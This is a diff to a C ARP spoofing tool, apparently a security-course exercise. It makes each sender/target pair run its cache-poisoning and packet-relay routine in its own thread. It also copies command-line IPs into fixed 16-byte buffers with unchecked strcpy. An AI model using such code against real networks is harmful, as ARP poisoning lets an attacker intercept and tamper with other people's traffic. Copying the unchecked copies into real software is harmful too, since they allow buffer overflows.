@@ -14,6 +14,13 @@ struct EthArpPacket {
 };
 #pragma pack(pop)
 
+#define MAX 100
+
+typedef struct ip_pair{
+	char s_ip[16];
+	char t_ip[16];
+}ip_pair;
+
 void usage() {
 	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
@@ -120,19 +127,24 @@ int arp_inf_attack(char* s_ip, char* s_mac, char* t_ip){
 	pcap_close(handle);
 }
 
-int arp_spoof(char* s_ip, char* t_ip){
+void* arp_spoof(void* ipp){
+	char s_ip[20];
+	char t_ip[20];
+	strcpy(s_ip, ((ip_pair *)ipp)->s_ip);
+	strcpy(t_ip, ((ip_pair *)ipp)->t_ip);
+
 	char s_mac[80];
 	char t_mac[80];
 	get_s_mac(s_ip, s_mac);
 	get_s_mac(t_ip, t_mac);
 	arp_inf_attack(s_ip, s_mac, t_ip);
 	printf("arp infection complete\n");
-
+	printf("good\n");
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
-		return -1;
+		return 0;
 	}
 
 	while (true){
@@ -189,11 +201,17 @@ int main(int argc, char* argv[]) {
 
 	a_mac = Mac(attacker_mac);
 	a_ip = Ip(attacker_ip);
-
+	ip_pair p[counter];
+	pthread_t threads[counter];
+   	int rc;
 	for(int i = 0; i < counter;i++){
-		if(arp_spoof(argv[2*i+2], argv[2*i+3])!=0){
-			printf("error while attacking!\n");
-		}
-		printf("attack succesful!\n");
+		strcpy(p[i].s_ip, argv[2*i+2]);
+		strcpy(p[i].t_ip, argv[2*i+3]);
+		rc = pthread_create(&threads[i], NULL, arp_spoof, (void *)&p[i]);
+      	if (rc) {
+         	printf("Error:unable to create thread\n");
+         	exit(-1);
+      	}
 	}
+	pthread_exit(NULL);
 }
